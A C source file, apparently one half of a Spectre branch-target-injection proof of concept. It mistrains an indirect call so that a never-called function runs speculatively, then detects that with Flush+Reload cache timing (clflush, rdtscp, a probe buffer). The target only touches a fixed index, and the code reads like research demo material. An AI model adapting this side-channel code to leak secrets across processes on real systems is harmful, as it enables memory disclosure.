#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>



//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

unsigned int junk=0;

// Put this in its own (4KB) page
uint8_t probe_buf[4096*256];


/*
 * This function is NEVER CALLED in measure.c
 * but if it is speculatively executed,
 * (because of a sucessful mistrain by inject.c)
 * then we'll load probe_buf[100] into cache
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile ( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)&probe_buf[100*4096]) : "rax");
}

// Keep stats
uint64_t cache_hits = 0;    // Basically number of times target_fn was speculatively executed
uint64_t tot_runs = 0;


uint64_t results[256];
int mix_offset = 13;

void test() {
    uint64_t t0, t1;

    int i, mix_i;
    for (i=0; i<256; i++) {
        //mix_i = ((i*167)+mix_offset) & 255;
        mix_i = i;
        uint8_t *addr = &probe_buf[mix_i*4096];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 120) {
            results[mix_i]++;
            cache_hits++;
        }
        //printf("# %lu\n", t1-t0);
        _mm_clflush(&probe_buf[mix_i*4096]);
    }
    mix_offset++;
    if (mix_offset > 256) {
        mix_offset = 13;
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<256; i++) {
        _mm_clflush(&probe_buf[i*4096]);
    }
}

void __attribute__((section(".fnptr"))) (*fn_ptr)(void); // we'll set this = test, and cflush it
uint64_t jmp_ptr;
uint64_t jmp_offsets_table[32*4096];

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile(
            "jmp call_get_rip\n"
        "get_rip:\n"
            "pop %%rax\n"
            "push %%rax\n"
            "ret\n"
        "call_get_rip:\n"
            "call get_rip\n"
            // Now we have rip in rax
            //1
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //2
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //3
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //4
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //5
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //6
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //7
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //8
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //9
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //10
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //11
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 12
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 13
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 14
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //15
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //16
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //...
            //1
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //2
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //3
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //4
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //5
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //6
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //7
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //8
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //9
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //10
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //11
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 12
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 13
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            // 14
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //15
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"
            //16
            "add (%%rbx), %%rax\n"
            "add $4096, %%rbx\n"
            "jmpq *%%rax\n"

            :: "b"(jmp_offsets_table) : "rax");

    // Do indirect jump
    (*fn_ptr)();
}


void measure() {
    fn_ptr = test;
    jmp_ptr = 0x400b5d;
    int i, j;
    while (1) {

        for (i=0; i<10000; i++) {
            _mm_clflush(fn_ptr);
            _mm_clflush(&jmp_ptr);
            for (j=0; j<32; j++) {
                _mm_clflush(&jmp_offsets_table[j*4096]);
            }
            indirect();
            usleep(1);
        }

        uint64_t max = 0, max_i=0;
        for (i=0; i<256; i++) {
            if (results[i] > max && i!=0) {
                max = results[i];
                max_i = i;
            }
        }
        //printf("%lu / %lu = %0.5f%% hits\n", cache_hits, tot_runs, 100*((float)cache_hits)/tot_runs);
        printf("[%lu]:  %lu / %lu = %0.5f%% hits (%lu total cache hits %0.2f)\n", max_i, max, tot_runs, 100*((float)max)/tot_runs, cache_hits, ((float)cache_hits)/tot_runs);
        memset(results, 0, 256*sizeof(uint64_t));
        cache_hits = 0;
        tot_runs = 0;
        usleep(10);
    }


}

void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    int i;
    for (i=0; i<32; i++) {
        jmp_offsets_table[i*4096] = 2*12;
    }
    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);
    printf("&x = %p\n", &x);

    fn_ptr = test;
    printf("test() @ %p\n", test);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);

    printf("target_fn = %p\n", target_fn);

    printf("measuring...\n");

    measure();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
